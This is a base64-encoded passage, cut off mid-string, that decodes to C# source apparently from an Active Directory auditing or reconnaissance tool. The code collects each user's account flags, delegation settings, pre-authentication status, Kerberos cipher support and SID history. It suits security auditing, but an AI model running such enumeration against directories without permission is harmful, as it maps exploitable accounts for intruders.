W10gcHJvY2Vzc1JlY29yZChPYmplY3QgcmVjb3JkKTsKICAgICAgICB9CgogICAgICAgIGNsYXNzIFVzZXJSZWNvcmRQcm9jZXNzb3IgOiBJUmVjb3JkUHJvY2Vzc29yCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgUFNPYmplY3RbXSBwcm9jZXNzUmVjb3JkKE9iamVjdCByZWNvcmQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFNlYXJjaFJlc3VsdCBBZFVzZXIgPSAoU2VhcmNoUmVzdWx0KSByZWNvcmQ7CiAgICAgICAgICAgICAgICAgICAgYm9vbD8gRW5hYmxlZCA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgYm9vbD8gQ2Fubm90Q2hhbmdlUGFzc3dvcmQgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2w/IFBhc3N3b3JkTmV2ZXJFeHBpcmVzID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBib29sPyBBY2NvdW50TG9ja2VkT3V0ID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBib29sPyBQYXNzd29yZEV4cGlyZWQgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2w/IFJldmVyc2libGVQYXNzd29yZEVuY3J5cHRpb24gPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2w/IERlbGVnYXRpb25QZXJtaXR0ZWQgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2w/IFNtYXJ0Y2FyZFJlcXVpcmVkID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBib29sPyBVc2VERVNLZXlPbmx5ID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBib29sPyBQYXNzd29yZE5vdFJlcXVpcmVkID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBib29sPyBUcnVzdGVkZm9yRGVsZWdhdGlvbiA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgYm9vbD8gVHJ1c3RlZHRvQXV0aGZvckRlbGVnYXRpb24gPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2w/IERvZXNOb3RSZXF1aXJlUHJlQXV0aCA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgYm9vbD8gS2VyYmVyb3NSQzQgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2w/IEtlcmJlcm9zQUVTMTI4ID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBib29sPyBLZXJiZXJvc0FFUzI1NiA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIERlbGVnYXRpb25UeXBlID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgRGVsZWdhdGlvblByb3RvY29sID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgRGVsZWdhdGlvblNlcnZpY2VzID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBib29sIE11c3RDaGFuZ2VQYXNzd29yZGF0TG9nb24gPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBpbnQ/IERheXNTaW5jZUxhc3RMb2dvbiA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgaW50PyBEYXlzU2luY2VMYXN0UGFzc3dvcmRDaGFuZ2UgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGludD8gQWNjb3VudEV4cGlyYXRpb25OdW1vZkRheXMgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2wgUGFzc3dvcmROb3RDaGFuZ2VkYWZ0ZXJNYXhBZ2UgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBib29sIE5ldmVyTG9nZ2VkSW4gPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBib29sIERvcm1hbnQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBEYXRlVGltZT8gTGFzdExvZ29uRGF0ZSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgRGF0ZVRpbWU/IFBhc3N3b3JkTGFzdFNldCA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgRGF0ZVRpbWU/IEFjY291bnRFeHBpcmVzID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gbnRTZWN1cml0eURlc2NyaXB0b3IgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2wgRGVueUV2ZXJ5b25lID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgYm9vbCBEZW55U2VsZiA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBTSURIaXN0b3J5ID0gIiI7CgogICAgICAgICAgICAgICAgICAgIC8vIFdoZW4gdGhlIHVzZXIgaXMgbm90IGFsbG93ZWQgdG8gcXVlcnkgdGhlIFVzZXJBY2NvdW50Q29udHJvbCBhdHRyaWJ1dGUuCiAgICAgICAgICAgICAgICAgICAgaWYgKEFkVXNlci5Qcm9wZXJ0aWVzWyJ1c2VyYWNjb3VudGNvbnRyb2wiXS5Db3VudCAhPSAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHVzZXJGbGFncyA9IChVQUNGbGFncykgQWRVc2VyLlByb3BlcnRpZXNbInVzZXJhY2NvdW50Y29udHJvbCJdWzBdOwogICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkID0gISgodXNlckZsYWdzICYgVUFDRmxhZ3MuQUNDT1VOVERJU0FCTEUpID09IFVBQ0ZsYWdzLkFDQ09VTlRESVNBQkxFKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFzc3dvcmROZXZlckV4cGlyZXMgPSAodXNlckZsYWdzICYgVUFDRmxhZ3MuRE9OVF9FWFBJUkVfUEFTU1dEKSA9PSBVQUNGbGFncy5ET05UX0VYUElSRV9QQVNTV0Q7CiAgICAgICAgICAgICAgICAgICAgICAgIEFjY291bnRMb2NrZWRPdXQgPSAodXNlckZsYWdzICYgVUFDRmxhZ3MuTE9DS09VVCkgPT0gVUFDRmxhZ3MuTE9DS09VVDsKICAgICAgICAgICAgICAgICAgICAgICAgRGVsZWdhdGlvblBlcm1pdHRlZCA9ICEoKHVzZXJGbGFncyAmIFVBQ0ZsYWdzLk5PVF9ERUxFR0FURUQpID09IFVBQ0ZsYWdzLk5PVF9ERUxFR0FURUQpOwogICAgICAgICAgICAgICAgICAgICAgICBTbWFydGNhcmRSZXF1aXJlZCA9ICh1c2VyRmxhZ3MgJiBVQUNGbGFncy5TTUFSVENBUkRfUkVRVUlSRUQpID09IFVBQ0ZsYWdzLlNNQVJUQ0FSRF9SRVFVSVJFRDsKICAgICAgICAgICAgICAgICAgICAgICAgUmV2ZXJzaWJsZVBhc3N3b3JkRW5jcnlwdGlvbiA9ICh1c2VyRmxhZ3MgJiBVQUNGbGFncy5FTkNSWVBURURfVEVYVF9QQVNTV09SRF9BTExPV0VEKSA9PSBVQUNGbGFncy5FTkNSWVBURURfVEVYVF9QQVNTV09SRF9BTExPV0VEOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VERVNLZXlPbmx5ID0gKHVzZXJGbGFncyAmIFVBQ0ZsYWdzLlVTRV9ERVNfS0VZX09OTFkpID09IFVBQ0ZsYWdzLlVTRV9ERVNfS0VZX09OTFk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhc3N3b3JkTm90UmVxdWlyZWQgPSAodXNlckZsYWdzICYgVUFDRmxhZ3MuUEFTU1dEX05PVFJFUUQpID09IFVBQ0ZsYWdzLlBBU1NXRF9OT1RSRVFEOwogICAgICAgICAgICAgICAgICAgICAgICBQYXNzd29yZEV4cGlyZWQgPSAodXNlckZsYWdzICYgVUFDRmxhZ3MuUEFTU1dPUkRfRVhQSVJFRCkgPT0gVUFDRmxhZ3MuUEFTU1dPUkRfRVhQSVJFRDsKICAgICAgICAgICAgICAgICAgICAgICAgVHJ1c3RlZGZvckRlbGVnYXRpb24gPSAodXNlckZsYWdzICYgVUFDRmxhZ3MuVFJVU1RFRF9GT1JfREVMRUdBVElPTikgPT0gVUFDRmxhZ3MuVFJVU1RFRF9GT1JfREVMRUdBVElPTjsKICAgICAgICAgICAgICAgICAgICAgICAgVHJ1c3RlZHRvQXV0aGZvckRlbGVnYXRpb24gPSAodXNlckZsYWdzICYgVUFDRmxhZ3MuVFJVU1RFRF9UT19BVVRIRU5USUNBVEVfRk9SX0RFTEVHQVRJT04pID09IFVBQ0ZsYWdzLlRSVVNURURfVE9fQVVUSEVOVElDQVRFX0ZPUl9ERUxFR0FUSU9OOwogICAgICAgICAgICAgICAgICAgICAgICBEb2VzTm90UmVxdWlyZVByZUF1dGggPSAodXNlckZsYWdzICYgVUFDRmxhZ3MuRE9OVF9SRVFVSVJFX1BSRUFVVEgpID09IFVBQ0ZsYWdzLkRPTlRfUkVRVUlSRV9QUkVBVVRIOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoQWRVc2VyLlByb3BlcnRpZXNbIm1zZHMtc3VwcG9ydGVkZW5jcnlwdGlvbnR5cGVzIl0uQ291bnQgIT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciB1c2VyS2VyYkVuY0ZsYWdzID0gKEtlcmJFbmNGbGFncykgQWRVc2VyLlByb3BlcnRpZXNbIm1zZHMtc3VwcG9ydGVkZW5jcnlwdGlvbnR5cGVzIl1bMF07CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh1c2VyS2VyYkVuY0ZsYWdzICE9IEtlcmJFbmNGbGFncy5aRVJPKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBLZXJiZXJvc1JDNCA9ICh1c2VyS2VyYkVuY0ZsYWdzICYgS2VyYkVuY0ZsYWdzLlJDNF9ITUFDKSA9PSBLZXJiRW5jRmxhZ3MuUkM0X0hNQUM7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBLZXJiZXJvc0FFUzEyOCA9ICh1c2VyS2VyYkVuY0ZsYWdzICYgS2VyYkVuY0ZsYWdzLkFFUzEyOF9DVFNfSE1BQ19TSEExXzk2KSA9PSBLZXJiRW5jRmxhZ3MuQUVTMTI4X0NUU19ITUFDX1NIQTFfOTY7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBLZXJiZXJvc0FFUzI1NiA9ICh1c2VyS2VyYkVuY0ZsYWdzICYgS2VyYkVuY0ZsYWdzLkFFUzI1Nl9DVFNfSE1BQ19TSEExXzk2KSA9PSBLZXJiRW5jRmxhZ3MuQUVTMjU2X0NUU19ITUFDX1NIQTFfOTY7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgLy8gV2hlbiB0aGUgdXNlciBpcyBub3QgYWxsb3dlZCB0byBxdWVyeSB0aGUgbnRzZWN1cml0eWRlc2NyaXB0b3IgYXR0cmlidXRlLgogICAgICAgICAgICAgICAgICAgIGlmIChBZFVzZXIuUHJvcGVydGllc1sibnRzZWN1cml0eWRlc2NyaXB0b3IiXS5Db3VudCAhPSAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgbnRTZWN1cml0eURlc2NyaXB0b3IgPSAoYnl0ZVtdKSBBZFVzZXIuUHJvcGVydGllc1sibnRzZWN1cml0eWRlc2NyaXB0b3IiXVswXTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgRGlyZWN0b3J5RW50cnkgQWRVc2VyRW50cnkgPSAoKFNlYXJjaFJlc3VsdClyZWNvcmQpLkdldERpcmVjdG9yeUVudHJ5KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIG50U2VjdXJpdHlEZXNjcmlwdG9yID0gKGJ5dGVbXSkgQWRVc2VyRW50cnkuT2JqZWN0U2VjdXJpdHkuR2V0U2VjdXJpdHlEZXNjcmlwdG9yQmluYXJ5Rm9ybSgpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAobnRTZWN1cml0eURlc2NyaXB0b3IgIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIERpcmVjdG9yeU9iamVjdFNlY3VyaXR5IERpck9ialNlYyA9IG5ldyBBY3RpdmVEaXJlY3RvcnlTZWN1cml0eSgpOwogICAgICAgICAgICAgICAgICAgICAgICBEaXJPYmpTZWMuU2V0U2VjdXJpdHlEZXNjcmlwdG9yQmluYXJ5Rm9ybShudFNlY3VyaXR5RGVzY3JpcHRvcik7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dGhvcml6YXRpb25SdWxlQ29sbGVjdGlvbiBBY2Nlc3NSdWxlcyA9IChBdXRob3JpemF0aW9uUnVsZUNvbGxlY3Rpb24pIERpck9ialNlYy5HZXRBY2Nlc3NSdWxlcyh0cnVlLGZhbHNlLHR5cGVvZihTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLk5UQWNjb3VudCkpOwogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChBY3RpdmVEaXJlY3RvcnlBY2Nlc3NSdWxlIFJ1bGUgaW4gQWNjZXNzUnVsZXMpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoQ29udmVydC5Ub1N0cmluZyhSdWxlLk9iamVjdFR5cGUpKS5FcXVhbHMoImFiNzIxYTUzLTFlMmYtMTFkMC05ODE5LTAwYWEwMDQwNTI5YiIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChSdWxlLkFjY2Vzc0NvbnRyb2xUeXBlLlRvU3RyaW5nKCkgPT0gIkRlbnkiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3RyaW5nIE9iamVjdE5hbWUgPSBDb252ZXJ0LlRvU3RyaW5nKFJ1bGUuSWRlbnRpdHlSZWZlcmVuY2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoT2JqZWN0TmFtZSA9PSAiRXZlcnlvbmUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZW55RXZlcnlvbmUgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChPYmplY3ROYW1lID09ICJOVCBBVVRIT1JJVFlcXFNFTEYiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZW55U2VsZiA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKERlbnlFdmVyeW9uZSAmJiBEZW55U2VsZikKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2Fubm90Q2hhbmdlUGFzc3dvcmQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2Fubm90Q2hhbmdlUGFzc3dvcmQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoQWRVc2VyLlByb3BlcnRpZXNbImxhc3Rsb2dvbnRpbWVzdGFtcCJdLkNvdW50ICE9IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBMYXN0TG9nb25EYXRlID0gRGF0ZVRpbWUuRnJvbUZpbGVUaW1lKChsb25nKShBZFVzZXIuUHJvcGVydGllc1sibGFzdGxvZ29udGltZXN0YW1wIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgRGF5c1NpbmNlTGFzdExvZ29uID0gTWF0aC5BYnMoKERhdGUxIC0gKERhdGVUaW1lKUxhc3RMb2dvbkRhdGUpLkRheXMpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoRGF5c1NpbmNlTGFzdExvZ29uID4gRG9ybWFudFRpbWVTcGFuKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEb3JtYW50ID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBOZXZlckxvZ2dlZEluID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKEFkVXNlci5Qcm9wZXJ0aWVzWyJwd2RMYXN0U2V0Il0uQ291bnQgIT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChDb252ZXJ0LlRvU3RyaW5nKEFkVXNlci5Qcm9wZXJ0aWVzWyJwd2RsYXN0c2V0Il1bMF0pID09ICIwIikKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChib29sKSBQYXNzd29yZE5ldmVyRXhwaXJlcyA9PSBmYWxzZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNdXN0Q2hhbmdlUGFzc3dvcmRhdExvZ29uID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhc3N3b3JkTGFzdFNldCA9IERhdGVUaW1lLkZyb21GaWxlVGltZSgobG9uZykoQWRVc2VyLlByb3BlcnRpZXNbInB3ZGxhc3RzZXQiXVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGF5c1NpbmNlTGFzdFBhc3N3b3JkQ2hhbmdlID0gTWF0aC5BYnMoKERhdGUxIC0gKERhdGVUaW1lKVBhc3N3b3JkTGFzdFNldCkuRGF5cyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoRGF5c1NpbmNlTGFzdFBhc3N3b3JkQ2hhbmdlID4gUGFzc01heEFnZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXNzd29yZE5vdENoYW5nZWRhZnRlck1heEFnZSA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKChJbnQ2NCkgQWRVc2VyLlByb3BlcnRpZXNbImFjY291bnRFeHBpcmVzIl1bMF0gIT0gKEludDY0KSA5MjIzMzcyMDM2ODU0Nzc1ODA3KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChJbnQ2NCkgQWRVc2VyLlByb3BlcnRpZXNbImFjY291bnRFeHBpcmVzIl1bMF0gIT0gKEludDY0KSAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL2h0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvbXM2NzUwOTgodj12cy44NSkuYXNweAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFjY291bnRFeHBpcmVzID0gRGF0ZVRpbWUuRnJvbUZpbGVUaW1lKChsb25nKShBZFVzZXIuUHJvcGVydGllc1siYWNjb3VudEV4cGlyZXMiXVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFjY291bnRFeHBpcmF0aW9uTnVtb2ZEYXlzID0gKChpbnQpKChEYXRlVGltZSlBY2NvdW50RXhwaXJlcyAtIERhdGUxKS5EYXlzKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCAvLyhFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKChib29sKSBUcnVzdGVkZm9yRGVsZWdhdGlvbikKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIERlbGVnYXRpb25UeXBlID0gIlVuY29uc3RyYWluZWQiOwogICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uU2VydmljZXMgPSAiQW55IjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKEFkVXNlci5Qcm9wZXJ0aWVzWyJtc0RTLUFsbG93ZWRUb0RlbGVnYXRlVG8iXS5Db3VudCA+PSAxKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgRGVsZWdhdGlvblR5cGUgPSAiQ29uc3RyYWluZWQiOwogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IEFkVXNlci5Qcm9wZXJ0aWVzWyJtc0RTLUFsbG93ZWRUb0RlbGVnYXRlVG8iXS5Db3VudDsgaSsrKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgZGVsZWdhdGV0byA9IEFkVXNlci5Qcm9wZXJ0aWVzWyJtc0RTLUFsbG93ZWRUb0RlbGVnYXRlVG8iXVtpXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlbGVnYXRpb25TZXJ2aWNlcyA9IERlbGVnYXRpb25TZXJ2aWNlcyArICIsIiArIENvbnZlcnQuVG9TdHJpbmcoZGVsZWdhdGV0byk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgRGVsZWdhdGlvblNlcnZpY2VzID0gRGVsZWdhdGlvblNlcnZpY2VzLlRyaW1TdGFydCgnLCcpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoKGJvb2wpIFRydXN0ZWR0b0F1dGhmb3JEZWxlZ2F0aW9uKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgRGVsZWdhdGlvblByb3RvY29sID0gIkFueSI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKERlbGVnYXRpb25UeXBlICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBEZWxlZ2F0aW9uUHJvdG9jb2wgPSAiS2VyYmVyb3MiOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoQWRVc2VyLlByb3BlcnRpZXNbInNpZGhpc3RvcnkiXS5Db3VudCA+PSAxKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIHNpZHMgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBBZFVzZXIuUHJvcGVydGllc1sic2lkaGlzdG9yeSJdLkNvdW50OyBpKyspCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBoaXN0b3J5ID0gQWRVc2VyLlByb3BlcnRpZXNbInNpZGhpc3RvcnkiXVtpXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNpZHMgPSBzaWRzICsgIiwiICsgQ29udmVydC5Ub1N0cmluZyhuZXcgU2VjdXJpdHlJZGVudGlmaWVyKChieXRlW10paGlzdG9yeSwgMCkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIFNJREhpc3RvcnkgPSBzaWRzLlRyaW1TdGFydCgnLCcpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgVXNlck9iaiA9IG5ldyBQU09iamVjdCgpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJVc2VyTmFtZSIsIChBZFVzZXIuUHJvcGVydGllc1sic2FtYWNjb3VudG5hbWUiXS5Db3VudCAhPSAwID8gQWRVc2VyLlByb3BlcnRpZXNbInNhbWFjY291bnRuYW1lIl1bMF0gOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTmFtZSIsIChBZFVzZXIuUHJvcGVydGllc1sibmFtZSJdLkNvdW50ICE9IDAgPyBDbGVhblN0cmluZyhBZFVzZXIuUHJvcGVydGllc1sibmFtZSJdWzBdKSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJFbmFibGVkIiwgRW5hYmxlZCkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNdXN0IENoYW5nZSBQYXNzd29yZCBhdCBMb2dvbiIsIE11c3RDaGFuZ2VQYXNzd29yZGF0TG9nb24pKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQ2Fubm90IENoYW5nZSBQYXNzd29yZCIsIENhbm5vdENoYW5nZVBhc3N3b3JkKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlBhc3N3b3JkIE5ldmVyIEV4cGlyZXMiLCBQYXNzd29yZE5ldmVyRXhwaXJlcykpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJSZXZlcnNpYmxlIFBhc3N3b3JkIEVuY3J5cHRpb24iLCBSZXZlcnNpYmxlUGFzc3dvcmRFbmNyeXB0aW9uKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNtYXJ0Y2FyZCBMb2dvbiBSZXF1aXJlZCIsIFNtYXJ0Y2FyZFJlcXVpcmVkKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlbGVnYXRpb24gUGVybWl0dGVkIiwgRGVsZWdhdGlvblBlcm1pdHRlZCkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJLZXJiZXJvcyBERVMgT25seSIsIFVzZURFU0tleU9ubHkpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiS2VyYmVyb3MgUkM0IiwgS2VyYmVyb3NSQzQpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiS2VyYmVyb3MgQUVTLTEyOGJpdCIsIEtlcmJlcm9zQUVTMTI4KSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIktlcmJlcm9zIEFFUy0yNTZiaXQiLCBLZXJiZXJvc0FFUzI1NikpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEb2VzIE5vdCBSZXF1aXJlIFByZSBBdXRoIiwgRG9lc05vdFJlcXVpcmVQcmVBdXRoKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk5ldmVyIExvZ2dlZCBpbiIsIE5ldmVyTG9nZ2VkSW4pKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1